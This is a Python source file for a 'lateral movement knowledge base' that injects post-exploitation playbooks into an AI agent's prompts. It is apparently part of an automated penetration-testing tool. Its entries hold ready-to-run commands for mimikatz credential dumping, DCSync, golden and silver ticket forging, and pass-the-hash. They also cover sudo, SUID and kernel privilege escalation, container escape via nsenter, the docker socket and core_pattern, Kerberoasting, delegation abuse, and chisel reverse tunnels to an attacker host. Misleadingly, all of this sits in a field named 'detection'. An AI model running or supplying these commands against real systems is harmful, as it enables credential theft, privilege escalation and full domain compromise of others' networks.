"""Lateral movement knowledge base.

Deep knowledge about post-exploitation lateral movement:
1. Windows Active Directory lateral movement
2. Linux privilege escalation and pivoting
3. Container escape techniques
4. Pass-the-Hash / Pass-the-Ticket
5. SSH pivoting and tunneling
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class LateralPattern:
    """A lateral movement pattern."""
    pattern_id: str = ""
    name: str = ""
    platform: str = ""
    severity: str = "critical"
    description: str = ""
    detection_strategy: str = ""
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:25],
            "platform": self.platform[:10],
        }


LATERAL_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "lat-001", "name": "Pass-the-Hash / Pass-the-Ticket",
        "platform": "windows", "severity": "critical",
        "desc": "Using stolen credentials for lateral movement.",
        "detection": (
            "PASS-THE-HASH / PASS-THE-TICKET:\n"
            "CREDENTIAL EXTRACTION:\n"
            "  mimikatz:\n"
            "    privilege::debug\n"
            "    sekurlsa::logonpasswords  # Dump plaintext + hashes\n"
            "    sekurlsa::wdigest  # WDigest plaintext\n"
            "    lsadump::sam  # Local SAM database\n"
            "    lsadump::dcsync /domain:<domain> /user:krbtgt  # DCSync\n"
            "  secretsdump.py (Impacket):\n"
            "    secretsdump.py <domain>/<user>:<pass>@<dc_ip>\n"
            "    secretsdump.py -hashes <lm:nt> <domain>/<user>@<dc_ip>\n"
            "PASS-THE-HASH:\n"
            "  # Use NTLM hash without cracking\n"
            "  pth-winexe -U <domain>/<user>%<lm:nt> //<target> cmd\n"
            "  psexec.py -hashes <lm:nt> <domain>/<user>@<target>\n"
            "  wmiexec.py -hashes <lm:nt> <domain>/<user>@<target>\n"
            "  evil-winrm -i <target> -u <user> -H <nt_hash>\n"
            "PASS-THE-TICKET:\n"
            "  # Extract Kerberos tickets\n"
            "  mimikatz: sekurlsa::tickets /export\n"
            "  # Inject ticket\n"
            "  mimikatz: kerberos::ptt <ticket.kirbi>\n"
            "  # Golden Ticket (krbtgt hash)\n"
            "  mimikatz: kerberos::golden /user:admin /domain:<domain> /sid:<sid> /krbtgt:<hash>\n"
            "  # Silver Ticket (service account hash)\n"
            "  mimikatz: kerberos::golden /user:admin /domain:<domain> /sid:<sid> /target:<server> /service:<svc> /rc4:<hash>"
        ),
        "tools": ["mimikatz", "impacket", "evil-winrm"],
    },
    {
        "id": "lat-002", "name": "Linux Privilege Escalation",
        "platform": "linux", "severity": "critical",
        "desc": "Escalating privileges on Linux systems.",
        "detection": (
            "LINUX PRIVILEGE ESCALATION:\n"
            "ENUMERATION:\n"
            "  # Automated\n"
            "  linpeas.sh  # Most comprehensive\n"
            "  linux-exploit-suggester.sh\n"
            "  pspy  # Monitor processes without root\n"
            "SUID/SGID BINARIES:\n"
            "  find / -perm -4000 -type f 2>/dev/null\n"
            "  find / -perm -2000 -type f 2>/dev/null\n"
            "  # Check GTFOBins for exploitation\n"
            "  # Common: nmap, vim, find, bash, python, perl\n"
            "SUDO MISCONFIGURATION:\n"
            "  sudo -l  # List sudo permissions\n"
            "  # Exploitable entries:\n"
            "  (ALL) NOPASSWD: /usr/bin/vim → :!/bin/bash\n"
            "  (ALL) NOPASSWD: /usr/bin/find → find . -exec /bin/sh \\;\n"
            "  (ALL) NOPASSWD: /usr/bin/python → python -c 'import os; os.system(\"/bin/sh\")'\n"
            "CRON JOBS:\n"
            "  cat /etc/crontab\n"
            "  ls -la /etc/cron.d/\n"
            "  # Writable cron scripts → inject commands\n"
            "  # PATH manipulation in cron\n"
            "KERNEL EXPLOITS:\n"
            "  uname -a  # Check kernel version\n"
            "  # DirtyPipe (CVE-2022-0847): 5.8 ≤ kernel < 5.16.11\n"
            "  # DirtyCow (CVE-2016-5195): kernel < 4.8.3\n"
            "CAPABILITIES:\n"
            "  getcap -r / 2>/dev/null\n"
            "  # cap_setuid → escalate\n"
            "  # cap_net_raw → packet sniffing"
        ),
        "tools": ["linpeas", "pspy", "linux-exploit-suggester"],
    },
    {
        "id": "lat-003", "name": "Container Escape",
        "platform": "container", "severity": "critical",
        "desc": "Breaking out of container environments.",
        "detection": (
            "CONTAINER ESCAPE:\n"
            "DETECTION:\n"
            "  # Am I in a container?\n"
            "  cat /proc/1/cgroup | grep -i docker\n"
            "  ls /.dockerenv\n"
            "  hostname  # Random hex = likely container\n"
            "PRIVILEGED CONTAINER:\n"
            "  # Check if privileged\n"
            "  cat /proc/self/status | grep CapEff\n"
            "  # If 000001ffffffffff → fully privileged\n"
            "  # Mount host filesystem\n"
            "  mkdir /mnt/host\n"
            "  mount /dev/sda1 /mnt/host\n"
            "  chroot /mnt/host /bin/bash\n"
            "  # Or use nsenter\n"
            "  nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash\n"
            "DOCKER SOCKET:\n"
            "  # Check for mounted Docker socket\n"
            "  ls -la /var/run/docker.sock\n"
            "  # If accessible → create privileged container\n"
            "  docker run -v /:/host -it alpine chroot /host /bin/bash\n"
            "KERNEL EXPLOITS:\n"
            "  # Container shares kernel with host\n"
            "  # DirtyPipe, DirtyCow work from inside container\n"
            "  # CVE-2022-0185: File system context exploit\n"
            "  # runc vulnerabilities (CVE-2024-21626)\n"
            "PROC/SYS ESCAPE:\n"
            "  # Release agent cgroup escape\n"
            "  # core_pattern escape\n"
            "  echo '|/path/to/script' > /proc/sys/kernel/core_pattern"
        ),
        "tools": ["deepce", "docker", "nsenter"],
    },
    {
        "id": "lat-004", "name": "SSH Pivoting and Tunneling",
        "platform": "linux", "severity": "high",
        "desc": "Using SSH for pivoting through compromised networks.",
        "detection": (
            "SSH PIVOTING AND TUNNELING:\n"
            "LOCAL PORT FORWARD:\n"
            "  # Access internal service through compromised host\n"
            "  ssh -L <local_port>:<internal_target>:<target_port> user@compromised\n"
            "  # Example: Access internal web server\n"
            "  ssh -L 8080:10.0.0.5:80 user@pivot\n"
            "  # Then browse: http://localhost:8080\n"
            "REMOTE PORT FORWARD:\n"
            "  # Make attacker service accessible to internal network\n"
            "  ssh -R <remote_port>:localhost:<local_port> user@compromised\n"
            "DYNAMIC (SOCKS) PROXY:\n"
            "  # Full SOCKS proxy through compromised host\n"
            "  ssh -D 1080 user@compromised\n"
            "  # Configure tools to use SOCKS proxy\n"
            "  proxychains nmap -sT <internal_target>\n"
            "  curl --socks5 localhost:1080 http://internal:8080\n"
            "SSHUTTLE (VPN over SSH):\n"
            "  # Route entire subnet through SSH\n"
            "  sshuttle -r user@compromised 10.0.0.0/24\n"
            "CHISEL (when SSH unavailable):\n"
            "  # Server (attacker):\n"
            "  chisel server --reverse --port 8000\n"
            "  # Client (compromised):\n"
            "  chisel client <attacker>:8000 R:socks\n"
            "  # Then use SOCKS proxy at attacker:1080\n"
            "MULTI-HOP:\n"
            "  ssh -J user@pivot1,user@pivot2 user@target\n"
            "  # Or ProxyJump in ~/.ssh/config"
        ),
        "tools": ["ssh", "chisel", "sshuttle", "proxychains"],
    },
    {
        "id": "lat-005", "name": "Windows AD Domain Attacks",
        "platform": "windows", "severity": "critical",
        "desc": "Active Directory domain-level attacks.",
        "detection": (
            "ACTIVE DIRECTORY DOMAIN ATTACKS:\n"
            "KERBEROASTING:\n"
            "  # Request TGS for service accounts\n"
            "  GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc>\n"
            "  # Crack offline with hashcat\n"
            "  hashcat -m 13100 <hashes> <wordlist>\n"
            "  # Targets service accounts with SPNs\n"
            "AS-REP ROASTING:\n"
            "  # Accounts with no pre-auth required\n"
            "  GetNPUsers.py <domain>/ -dc-ip <dc> -no-pass -usersfile users.txt\n"
            "  hashcat -m 18200 <hashes> <wordlist>\n"
            "DCSYNC:\n"
            "  # Replicate AD credentials (needs Replicating Directory Changes)\n"
            "  secretsdump.py <domain>/<user>:<pass>@<dc_ip>\n"
            "  mimikatz: lsadump::dcsync /domain:<domain> /all\n"
            "BLOODHOUND:\n"
            "  # Map AD attack paths\n"
            "  bloodhound-python -c All -d <domain> -u <user> -p <pass> -dc <dc>\n"
            "  # Import into BloodHound GUI\n"
            "  # Find: shortest path to DA, Kerberoastable users, DCSync targets\n"
            "DELEGATION ATTACKS:\n"
            "  # Unconstrained delegation → capture TGTs\n"
            "  # Constrained delegation → impersonate any user\n"
            "  # Resource-based constrained delegation (RBCD)\n"
            "  rbcd.py <domain>/<user>:<pass> -delegate-to <target> -delegate-from <controlled>\n"
            "  getST.py <domain>/<controlled>:<pass> -spn <service>/<target> -impersonate admin"
        ),
        "tools": ["impacket", "bloodhound", "mimikatz"],
    },
]


class LateralMovementKB:
    """Lateral movement knowledge base.

    Provides post-exploitation lateral movement
    patterns injected into agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, LateralPattern] = {}
        self._log = logger.bind(component="lateral_movement_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load lateral movement patterns."""
        for data in LATERAL_PATTERNS:
            pattern = LateralPattern(
                pattern_id=data["id"],
                name=data["name"],
                platform=data.get("platform", ""),
                severity=data.get("severity", "critical"),
                description=data.get("desc", ""),
                detection_strategy=data.get("detection", ""),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_by_platform(self, platform: str) -> list[LateralPattern]:
        """Get patterns by platform."""
        return [
            p for p in self._patterns.values()
            if p.platform.lower() == platform.lower()
        ]

    def build_lateral_prompt(
        self,
        platforms: list[str] | None = None,
        max_patterns: int = 4,
    ) -> str:
        """Build lateral movement prompt."""
        lines = ["## Lateral Movement Patterns\n"]
        count = 0
        for pattern in self._patterns.values():
            if platforms and pattern.platform.lower() not in [p.lower() for p in platforms]:
                continue
            if count >= max_patterns:
                break
            lines.append(f"### {pattern.name} [{pattern.platform.upper()}]")
            lines.append(pattern.detection_strategy)
            lines.append("")
            count += 1
        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        plat_counts: dict[str, int] = {}
        for p in self._patterns.values():
            plat_counts[p.platform] = plat_counts.get(p.platform, 0) + 1
        return {
            "patterns": len(self._patterns),
            "by_platform": plat_counts,
        }
